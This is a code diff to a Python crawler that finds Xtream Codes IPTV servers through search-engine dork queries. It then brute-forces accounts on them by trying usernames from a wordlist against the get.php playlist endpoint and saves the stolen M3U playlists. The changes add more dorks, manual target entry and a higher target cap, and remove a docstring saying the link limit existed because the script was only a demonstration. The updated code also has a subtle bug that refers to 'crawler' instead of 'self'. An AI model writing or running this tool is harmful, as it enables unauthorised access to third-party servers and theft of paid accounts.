@@ -16,68 +16,80 @@ Arm4x (@Arm4x)
 """
 class Crawler(object):
     # version
-    version = "1.2.3"
+    version = "1.2.4"
     # output default directory
     outputDir = "output"
     # language default directory
     languageDir = "languages"
     # string used to exploit the CMS
     basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
-    # string used to search the CMS
-    searchString = "Xtream Codes v1.0.59.5"
+    # queries used to search IPTV servers across search engines
+    searchQueries = [
+        "Xtream Codes v1.0.59.5",
+        "inurl:get.php?username= password= type=m3u",
+        "inurl:c/ player_api.php",
+        "inurl::8080/get.php?username=",
+        "inurl::8000/get.php?username="
+    ]
 
     def __init__(self, language="it"):
-        """Default constructor
-
-        Keyword arguments:
-        language -- Language parameter allows us to understand what kind of
-                    names file we need to use. (default it)
-        """
+        """Default constructor"""
         self.language = language.lower()
         self.parsedUrls = []
         self.foundedAccounts = 0
 
     def change_language(self, language="it"):
-        """Set the language you want to use to brute force names
-
-        Keyword arguments:
-        language -- Language parameter allows us to understand what kind of
-                    names file we need to use. (default it)
-
-        Return:
-        boolean -- true if the language file exists, otherwise false
-        """
+        """Set the language you want to use to brute force names"""
         if os.path.isfile(os.path.join(self.languageDir, language + ".txt")):
             self.language = language
             return True
         else:
             return False
 
-    def search_links(self):
-        """Print the first 30 links from a Web search
+    def add_custom_url(self, url):
+        """Allow manually adding a target server URL"""
+        if not url:
+            return False
+        if not url.startswith("http://") and not url.startswith("https://"):
+            url = "http://" + url
+        parsed = urlparse(url)
+        clean_url = parsed.scheme + "://" + parsed.netloc
+        if clean_url not in self.parsedUrls:
+            self.parsedUrls.append(clean_url)
+            return True
+        return False
 
-        We set the limit of 30 links because this script serve as demonstration and it's
-        not intended to be use for personal purpose.
-        """
-        try:
-            for url in search(self.searchString, num_results=30):
-                parsed = urlparse(url)
-                self.parsedUrls.append(parsed.scheme + "://" + parsed.netloc)
-                if len(self.parsedUrls) >= 30:
-                    break
-        except Exception as e:
-            print(f"Error fetching links: {e}")
+    def search_links(self, custom_query=None):
+        """Fetch IPTV server links from web search engines"""
+        queries = [custom_query] if custom_query else self.searchQueries
+        found = 0
+
+        for query in queries:
+            try:
+                for url in search(query, num_results=15):
+                    parsed = urlparse(url)
+                    base_url = parsed.scheme + "://" + parsed.netloc
+                    if base_url and base_url not in self.parsedUrls:
+                        self.parsedUrls.append(base_url)
+                        found += 1
+                    if len(self.parsedUrls) >= 50:
+                        break
+            except Exception as e:
+                print(f"Error fetching links for query '{query}': {e}")
+
+        return found
 
     def search_accounts(self, url=None):
-        """Search Accounts
-        This is the core method. It will crawl the given url for any possible accounts.
-        """
+        """Search Accounts"""
         if not self.parsedUrls:
-            return "You must fetch some URLs first"
+            return "You must fetch or add some URLs first"
         try:
             if not url:
                 url = random.choice(self.parsedUrls)
             fileName = os.path.join(self.languageDir, self.language + ".txt")
+            if not os.path.exists(fileName):
+                return "Language file does not exist"
+                
             fileLength = self.file_length(fileName)
             progressBar = pyprind.ProgBar(fileLength, title="Fetching account from " + url + " this might take a while.", stream=1, monitor=True)
             self.foundedAccounts = 0
@@ -94,20 +106,21 @@ class Crawler(object):
                     res = requests.get(target_url, headers=headers, timeout=5)
                     fetched = res.text
                     if len(fetched) > 0 and "#EXTM3U" in fetched:
-                        newPath = os.path.join(self.outputDir, url.replace("http://", "").replace("https://", ""))
-                        self.create_file(username, newPath, fetched)
+                        domain = url.replace("http://", "").replace("https://", "").strip("/")
+                        new_path = os.path.join(crawler.outputDir, domain)
+                        self.create_file(username, new_path, fetched)
                 except requests.RequestException:
                     pass
                 
                 progressBar.update()
 
-            self.parsedUrls.remove(url)
+            if url in self.parsedUrls:
+                self.parsedUrls.remove(url)
+
             if self.foundedAccounts != 0:
                 return "Search done, account founded on " + url + ": " + str(self.foundedAccounts)
             else:
                 return "No results for " + url
-        except IOError:
-            return "Cannot open the current Language file. Try another one"
         except Exception as e:
             return f"Ops something went wrong: {e}"
 
